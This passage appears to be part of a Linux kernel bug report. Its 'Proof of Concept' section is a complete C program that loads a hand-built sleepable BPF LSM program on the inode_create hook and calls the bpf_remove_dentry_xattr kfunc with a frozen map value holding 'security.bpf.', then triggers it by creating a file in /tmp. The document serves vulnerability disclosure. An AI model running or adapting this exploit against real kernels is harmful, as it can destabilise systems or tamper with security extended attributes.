## Proof of Concept
The following C program demonstrates the vulnerability on the latest 
bpf-next (commit 6f6c794d0ff05dab1fa4677f39043de8a6a80da3)：

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <string.h>
#include <bpf/btf.h>
#include <bpf/bpf.h>

#ifndef BPF_F_SLEEPABLE
#define BPF_F_SLEEPABLE (1U << 4)
#endif

#ifndef BPF_PSEUDO_KFUNC_CALL
#define BPF_PSEUDO_KFUNC_CALL 2
#endif

#ifndef BPF_PSEUDO_MAP_VALUE
#define BPF_PSEUDO_MAP_VALUE 2
#endif

int main() {
     int hook_id = -1;
     int kfunc_id = -1;

     struct btf *b = btf__parse("/sys/kernel/btf/vmlinux", NULL);
     if (!b) {
         printf("[-] Failed to parse BTF\n");
         return 1;
     }

     for (int i = 1; i < btf__type_cnt(b); i++) {
         const struct btf_type *t = btf__type_by_id(b, i);
         if (btf_is_func(t)) {
             const char *name = btf__name_by_offset(b, t->name_off);
             if (strcmp(name, "bpf_lsm_inode_create") == 0) {
                 hook_id = i;
             } else if (strcmp(name, "bpf_remove_dentry_xattr") == 0) {
                 kfunc_id = i;
             }
         }
     }

     if (hook_id < 0 || kfunc_id < 0) return 1;

     // Create an ARRAY map for the string
     union bpf_attr map_attr = {
         .map_type = BPF_MAP_TYPE_ARRAY,
         .key_size = 4,
         .value_size = 16,
         .max_entries = 1,
         .map_flags = (1U << 7),
     };
     int map_fd = syscall(__NR_bpf, BPF_MAP_CREATE, &map_attr, 
sizeof(map_attr));
     if (map_fd < 0) {
         perror("map create");
         return 1;
     }

     int key = 0;
     char val[16] = "security.bpf.";
     union bpf_attr update_attr = {
         .map_fd = map_fd,
         .key = (uint64_t)&key,
         .value = (uint64_t)val,
         .flags = BPF_ANY,
     };
     syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &update_attr, 
sizeof(update_attr));
     union bpf_attr freeze_attr = { .map_fd = map_fd };
     syscall(__NR_bpf, BPF_MAP_FREEZE, &freeze_attr, sizeof(freeze_attr));

     struct bpf_insn insns[] = {
         // r1 = ctx->dentry
         { 0x79, 1, 1, 8, 0 },

         // save ctx->dentry in r6
         { 0xbf, 6, 1, 0, 0 },

         // r1 = map_fd (for map_lookup)
         // bpf_map_lookup_elem needs: r1 = map_fd, r2 = ref to key
         { 0x18, 1, 0, 0, map_fd },
         { 0x00, 0, 0, 0, 0 },

         // r10 - 4 = 0
         { 0xb7, 0, 0, 0, 0 },
         { 0x63, 10, 0, -4, 0 },
         // r2 = r10 - 4
         { 0xbf, 2, 10, 0, 0 },
         { 0x07, 2, 0, 0, -4 },

         // call bpf_map_lookup_elem
         { 0x85, 0, 0, 0, BPF_FUNC_map_lookup_elem },

         // if r0 == NULL, jump to exit (+3)
         // 0x15 = BPF_JMP | BPF_JEQ | BPF_K
         // opcode, dst_reg, src_reg, off, imm
         { 0x15, 0, 0, 3, 0 },

         // prepare kfunc call
         { 0xbf, 2, 0, 0, 0 },  // r2 = r0 (map val pointer)
         { 0xbf, 1, 6, 0, 0 },  // r1 = r6 (ctx->dentry)
         { 0x85, 0, BPF_PSEUDO_KFUNC_CALL, 0, kfunc_id },

         // exit
         { 0xb7, 0, 0, 0, 0 },
         { 0x95, 0, 0, 0, 0 }
     };

     insns[2].src_reg = 1;
     char log_buf[65536] = {0};
     union bpf_attr attr = {
         .prog_type = 29,
         .insn_cnt = sizeof(insns) / sizeof(insns[0]),
         .insns = (uint64_t)insns,
         .license = (uint64_t)"GPL",
         .log_level = 2,
         .log_size = sizeof(log_buf),
         .log_buf = (uint64_t)log_buf,
         .expected_attach_type = 27,
         .attach_btf_id = hook_id,
         .prog_flags = BPF_F_SLEEPABLE
     };

     int prog_fd = syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
     if (prog_fd < 0) {
         printf("[-] prog load failed:\n%s\n", log_buf);
         return 1;
     }
     printf("[+] BPF program loaded (fd: %d)\n", prog_fd);

     union bpf_attr link_attr;
     memset(&link_attr, 0, sizeof(link_attr));
     link_attr.link_create.prog_fd = prog_fd;
     link_attr.link_create.target_fd = 0;
     link_attr.link_create.attach_type = 27;

     int link_fd = syscall(__NR_bpf, 28, &link_attr, sizeof(link_attr));
     if (link_fd < 0) {
         perror("[-] bpf_link_create failed");
         return 1;
     }
     printf("[+] linked\n");

     printf("[!] Triggering...\n");
     int fd = open("/tmp/trigger_vuln_file", O_CREAT | O_RDWR, 0666);
     if (fd >= 0) {
         close(fd);
         unlink("/tmp/trigger_vuln_file");
     }

     return 0;
}
